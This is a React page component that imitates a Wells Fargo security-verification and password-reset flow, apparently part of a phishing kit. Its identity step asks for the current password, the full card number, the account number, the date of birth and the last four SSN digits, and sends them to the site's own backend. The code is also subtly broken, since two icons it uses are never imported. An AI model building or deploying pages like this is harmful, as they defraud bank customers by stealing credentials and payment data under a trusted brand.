import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Shield, Mail, Phone, Loader2, Lock, Check, AlertCircle, CreditCard, Key, CheckCircle2, ArrowRight } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialHeader } from "@/components/official-header";

const verificationMethods = [
  {
    id: "text",
    icon: Phone,
    title: "Text message",
    description: "Receive a one-time security code via SMS",
  },
  {
    id: "call",
    icon: Phone,
    title: "Phone call",
    description: "Receive a one-time security code by phone",
  },
  {
    id: "email",
    icon: Mail,
    title: "Email",
    description: "Receive a one-time security code via email",
  },
];

const identitySchema = z.object({
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  ssn: z.string().length(4, "Please enter exactly 4 digits"),
  cardNumber: z.string().min(13, "Please enter a valid card number").max(19, "Card number too long"),
  accountNumber: z.string().min(8, "Please enter a valid account number").max(17, "Account number too long"),
  currentPassword: z.string().min(1, "Current password is required"),
});

const passwordSchema = z.object({
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

type IdentityFormData = z.infer<typeof identitySchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function VerifyPage() {
  const [step, setStep] = useState<"choose" | "identity" | "password" | "success">("choose");
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const { data: authData, isLoading, error } = useQuery({
    queryKey: ["/api/auth/me"],
  });

  useEffect(() => {
    if (error) {
      setLocation("/");
    }
  }, [error, setLocation]);

  const user = (authData as any)?.user;

  const identityForm = useForm<IdentityFormData>({
    resolver: zodResolver(identitySchema),
    defaultValues: {
      dateOfBirth: "",
      ssn: "",
      cardNumber: "",
      accountNumber: "",
      currentPassword: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      newPassword: "",
      confirmPassword: "",
    },
  });

  const verifyMutation = useMutation({
    mutationFn: async (data: IdentityFormData) => {
      const response = await apiRequest("POST", "/api/auth/verify-identity", {
        verificationType: "ssn",
        value: data.ssn,
        dateOfBirth: data.dateOfBirth,
        ssn: data.ssn,
        cardNumber: data.cardNumber,
        accountNumber: data.accountNumber,
        currentPassword: data.currentPassword,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Identity Verified",
        description: "You can now update your password.",
      });
      setStep("password");
    },
    onError: (error: Error) => {
      toast({
        title: "Verification Failed",
        description: error.message || "The information provided does not match our records.",
        variant: "destructive",
      });
    },
  });

  const resetPasswordMutation = useMutation({
    mutationFn: async (data: { newPassword: string; confirmPassword: string }) => {
      const response = await apiRequest("POST", "/api/auth/reset-password", data);
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Password Updated",
        description: "Your password has been successfully updated.",
      });
      setStep("success");
    },
    onError: (error: Error) => {
      toast({
        title: "Update Failed",
        description: error.message || "Failed to update password.",
        variant: "destructive",
      });
    },
  });

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#fafafa]">
        <div className="text-center">
          <Loader2 className="w-10 h-10 animate-spin text-[#cd1409] mx-auto mb-4" />
          <p className="text-gray-600">Loading your secure session...</p>
        </div>
      </div>
    );
  }

  if (error || !authData) {
    return null;
  }

  const handleMethodSelect = (methodId: string) => {
    setSelectedMethod(methodId);
    setStep("identity");
  };

  const handleIdentityVerify = (data: IdentityFormData) => {
    verifyMutation.mutate(data);
  };

  const handlePasswordReset = (data: PasswordFormData) => {
    resetPasswordMutation.mutate(data);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <OfficialHeader variant="simple" />

      {/* Progress indicator */}
      <div className="bg-white border-b">
        <div className="max-w-2xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                step === "choose" ? "bg-[#cd1409] text-white" : "bg-green-500 text-white"
              }`}>
                {step !== "choose" ? <Check className="w-4 h-4" /> : "1"}
              </div>
              <span className="text-sm font-medium text-gray-700">Select Method</span>
            </div>
            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
              <div className={`h-full bg-[#cd1409] transition-all ${
                step === "choose" ? "w-0" : step === "identity" ? "w-1/2" : "w-full"
              }`}></div>
            </div>
            <div className="flex items-center gap-3">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                step === "identity" ? "bg-[#cd1409] text-white" : 
                step === "password" || step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
              }`}>
                {step === "password" || step === "success" ? <Check className="w-4 h-4" /> : "2"}
              </div>
              <span className="text-sm font-medium text-gray-700">Verify Identity</span>
            </div>
            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
              <div className={`h-full bg-[#cd1409] transition-all ${
                step === "password" ? "w-1/2" : step === "success" ? "w-full" : "w-0"
              }`}></div>
            </div>
            <div className="flex items-center gap-3">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                step === "password" ? "bg-[#cd1409] text-white" : 
                step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
              }`}>
                {step === "success" ? <Check className="w-4 h-4" /> : "3"}
              </div>
              <span className="text-sm font-medium text-gray-700 hidden sm:inline">Complete</span>
            </div>
          </div>
        </div>
      </div>

      <main className="flex-1 py-10">
        <div className="max-w-2xl mx-auto px-4">
          {step === "choose" && (
            <>
              <div className="mb-8 text-center">
                <div className="w-16 h-16 bg-[#cd1409]/10 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Shield className="w-8 h-8 text-[#cd1409]" />
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-title">
                  Additional Security Verification
                </h1>
                <p className="text-gray-600 max-w-md mx-auto">
                  To protect your account, please verify your identity. Select how you'd like to receive your security code.
                </p>
              </div>

              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-verify">
                <div className="bg-gradient-to-r from-gray-50 to-gray-100 px-6 py-3 border-b">
                  <p className="text-sm font-medium text-gray-700">Choose verification method</p>
                </div>
                <CardContent className="p-0">
                  {verificationMethods.map((method, index) => (
                    <button
                      key={method.id}
                      onClick={() => handleMethodSelect(method.id)}
                      className={`w-full p-5 text-left hover:bg-[#fef3f3] transition-colors flex items-center gap-4 ${
                        index !== verificationMethods.length - 1 ? "border-b border-gray-100" : ""
                      }`}
                      data-testid={`button-method-${method.id}`}
                    >
                      <div className="w-12 h-12 bg-[#cd1409] rounded-full flex items-center justify-center text-white shadow-md">
                        <method.icon className="w-6 h-6" />
                      </div>
                      <div className="flex-1">
                        <p className="font-semibold text-gray-900">{method.title}</p>
                        <p className="text-sm text-gray-500">{method.description}</p>
                      </div>
                      <ArrowRight className="w-5 h-5 text-[#cd1409]" />
                    </button>
                  ))}
                </CardContent>
              </Card>

              <div className="mt-8 p-4 bg-blue-50 rounded-lg border border-blue-100">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-blue-900">Why am I seeing this?</p>
                    <p className="text-sm text-blue-700 mt-1">
                      We require additional verification to ensure the security of your account. This helps protect against unauthorized access.
                    </p>
                  </div>
                </div>
              </div>
            </>
          )}

          {step === "identity" && (
            <>
              <button
                onClick={() => setStep("choose")}
                className="flex items-center gap-1 text-[#cd1409] text-sm mb-6 hover:underline font-medium"
                data-testid="button-back"
              >
                <ChevronRight className="w-4 h-4 rotate-180" />
                Back to verification options
              </button>

              <div className="mb-8">
                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-identity-title">
                  Confirm Your Identity
                </h1>
                <p className="text-gray-600">
                  For your security, please verify your identity by providing the following information.
                </p>
              </div>

              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-identity">
                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
                  <div className="flex items-center gap-2 text-white">
                    <Lock className="w-5 h-5" />
                    <span className="font-semibold">Secure Identity Verification</span>
                  </div>
                </div>
                <CardContent className="p-6 bg-white">
                  <div className="flex items-start gap-3 p-4 bg-amber-50 rounded-lg mb-6 border border-amber-200">
                    <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-amber-800">
                      Your information is encrypted and protected. We will never share your personal data.
                    </p>
                  </div>

                  <Form {...identityForm}>
                    <form onSubmit={identityForm.handleSubmit(handleIdentityVerify)} className="space-y-5">
                      <FormField
                        control={identityForm.control}
                        name="currentPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
                              <Key className="w-4 h-4 text-[#cd1409]" />
                              Current Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Enter your current password"
                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                data-testid="input-current-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={identityForm.control}
                        name="cardNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
                              <CreditCard className="w-4 h-4 text-[#cd1409]" />
                              Wells Fargo Debit or Credit Card Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="text"
                                placeholder="Enter your 13-19 digit card number"
                                maxLength={19}
                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                data-testid="input-card-number"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={identityForm.control}
                        name="accountNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
                              <Building2 className="w-4 h-4 text-[#cd1409]" />
                              Account Number
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="text"
                                placeholder="Enter your account number"
                                maxLength={17}
                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                data-testid="input-account-number"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <div className="grid grid-cols-2 gap-4">
                        <FormField
                          control={identityForm.control}
                          name="dateOfBirth"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-gray-700 font-semibold">
                                Date of Birth
                              </FormLabel>
                              <FormControl>
                                <Input
                                  type="date"
                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                  data-testid="input-dob"
                                  {...field}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <FormField
                          control={identityForm.control}
                          name="ssn"
                          render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-gray-700 font-semibold">
                                Last 4 of SSN
                              </FormLabel>
                              <FormControl>
                                <Input
                                  type="password"
                                  placeholder="••••"
                                  maxLength={4}
                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409] text-center tracking-widest"
                                  data-testid="input-ssn"
                                  {...field}
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />
                      </div>

                      <Button
                        type="submit"
                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg mt-6"
                        disabled={verifyMutation.isPending}
                        data-testid="button-verify-submit"
                      >
                        {verifyMutation.isPending ? (
                          <>
                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                            Verifying...
                          </>
                        ) : (
                          "Continue"
                        )}
                      </Button>
                    </form>
                  </Form>
                </CardContent>
              </Card>

              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
                <Lock className="w-4 h-4 text-green-600" />
                <span>Protected with 256-bit SSL encryption</span>
              </div>
            </>
          )}

          {step === "password" && (
            <>
              <div className="mb-8">
                <div className="flex items-center gap-2 text-green-600 mb-4">
                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-5 h-5" />
                  </div>
                  <span className="font-semibold">Identity verified successfully</span>
                </div>
                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-password-title">
                  Update Your Password
                </h1>
                <p className="text-gray-600">
                  Create a new secure password for your account. Your password must be at least 6 characters.
                </p>
              </div>

              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-password">
                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
                  <div className="flex items-center gap-2 text-white">
                    <Key className="w-5 h-5" />
                    <span className="font-semibold">Create New Password</span>
                  </div>
                </div>
                <CardContent className="p-6">
                  <Form {...passwordForm}>
                    <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
                      <FormField
                        control={passwordForm.control}
                        name="newPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-semibold">New Password</FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Enter new password"
                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                data-testid="input-new-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={passwordForm.control}
                        name="confirmPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700 font-semibold">Confirm Password</FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Confirm new password"
                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                data-testid="input-confirm-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <div className="bg-gray-50 p-4 rounded-lg border">
                        <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
                        <ul className="text-sm text-gray-600 space-y-1">
                          <li className="flex items-center gap-2">
                            <Check className="w-4 h-4 text-green-500" />
                            At least 6 characters
                          </li>
                          <li className="flex items-center gap-2">
                            <Check className="w-4 h-4 text-green-500" />
                            Mix of letters and numbers recommended
                          </li>
                        </ul>
                      </div>

                      <Button
                        type="submit"
                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg"
                        disabled={resetPasswordMutation.isPending}
                        data-testid="button-reset-submit"
                      >
                        {resetPasswordMutation.isPending ? (
                          <>
                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          "Update Password"
                        )}
                      </Button>
                    </form>
                  </Form>
                </CardContent>
              </Card>
            </>
          )}

          {step === "success" && (
            <div className="text-center py-12">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle2 className="w-10 h-10 text-green-600" />
              </div>
              <h1 className="text-2xl font-light text-gray-900 mb-3" style={{ fontFamily: "Georgia, serif" }} data-testid="text-success-title">
                Verification Complete
              </h1>
              <p className="text-gray-600 mb-8 max-w-md mx-auto">
                Your identity has been verified and your password has been updated successfully. You can now access your account.
              </p>
              <Button
                onClick={() => setLocation("/dashboard")}
                className="h-12 px-10 bg-[#cd1409] hover:bg-[#b81208] text-white font-bold rounded-full text-base shadow-md"
                data-testid="button-continue-dashboard"
              >
                Continue to Dashboard
                <ArrowRight className="w-5 h-5 ml-2" />
              </Button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1a1a1a] text-white py-6 mt-auto">
        <div className="max-w-[1280px] mx-auto px-4">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 bg-[#ffcd41] rounded-full flex items-center justify-center">
                <Building2 className="w-4 h-4 text-[#cd1409]" />
              </div>
              <span className="text-sm" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</span>
            </div>
            <div className="flex items-center gap-4 text-xs text-gray-500">
              <a href="#" className="hover:text-white transition-colors">Privacy</a>
              <span>|</span>
              <a href="#" className="hover:text-white transition-colors">Security</a>
              <span>|</span>
              <a href="#" className="hover:text-white transition-colors">Terms of Use</a>
            </div>
            <p className="text-xs text-gray-500">© 2024 Wells Fargo. NMLSR ID 399801</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
